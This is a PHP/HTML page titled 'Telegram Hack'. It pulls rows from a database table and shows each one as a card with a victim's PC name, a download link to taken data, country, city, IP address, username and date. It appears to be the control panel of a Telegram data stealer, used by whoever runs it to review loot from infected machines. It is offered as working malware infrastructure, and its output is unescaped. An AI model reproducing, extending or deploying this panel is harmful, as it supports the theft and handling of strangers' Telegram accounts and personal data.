       <?php 
        $host='localhost';
        $user='db_user';
        $db='db_name';
        $pass='db_pass';
        $con= mysqli_connect($host,$user,$pass,$db);
        $res=mysqli_query($con,"select * from pc")
        ?>
          <body style=" padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:
    		fixed;
    		border-bottom:1px solid
    		rgba(255,255,255,0);
    		color: #009cff;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #009cff;
    		">
 <?php
while( $row =mysqli_fetch_array($res))
{
    print('
    <body style=" padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:
    		fixed;
    		border-bottom:1px solid
    		rgba(255,255,255,0);
    		color: #009cff;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #009cff;
    		">
	<p style="text-align: center;margin:40px 0;">
		<img height="100px;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Telegram_Messenger.png/800px-Telegram_Messenger.png">
	</p>
	<div style=" margin:0 auto;
			max-width: 900px;
			width: 100%;
			border: 2px solid #009cff;
			border-radius: 4px;
			box-shadow: 0 0 20px #009cff;
			">


		<div align="center" style=" padding:10px 20px;  ">
          <h1 style="text-align: center;">Holr</h1>
			<p style="text-align: center;">Telegram Information | Pc Name = '.$row["UserPc"].'  </p>
			<p>
				</p><hr style="height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;"><table style="margin:40px 0;border-bottom: 4px solid #6b5c5c;padding: 20px 0;border-radius: 4px;border-top: 4px solid #6b5c5c;">
					<tbody><tr>
						<td style=" width: 30%;">
							|Data Download|
						</td>
						<td>: 
						'.$row["url"].'					</td>
					</tr>
					
					

					<tr>
						<td style=" width: 30%;">
							|Country - City|
						</td>
						<td>: 
'.$row["country"].'	 - '.$row["city"]. '  <img src="http://www.zone-h.org/images/cflags/png/jo.png" alt="" style="width: 25px; height: 13px;">				</td>
					</tr>
                    
                    
					<tr>
						<td style=" width: 30%;">
							|ip|
						</td>
						<td>: 
						'.$row["ip"].'
						</td>
					</tr>
					<tr>
						<td style=" width: 30%;">
							|Username|


						</td>
						<td>: 
						'.$row["UserPc"].'
						</td>
                      </tr>
					<tr>
						<td style=" width: 30%;">
							|Time / Date|
						</td>
						<td>: 
						'.$row["data"].'
						</td>
                      </tr>
                      
				</tbody></table>
                <hr style="height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;">
			<p></p>
		</div>
	</div>
    
');
}
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Telegram Hack</title>
</head>





</body></html>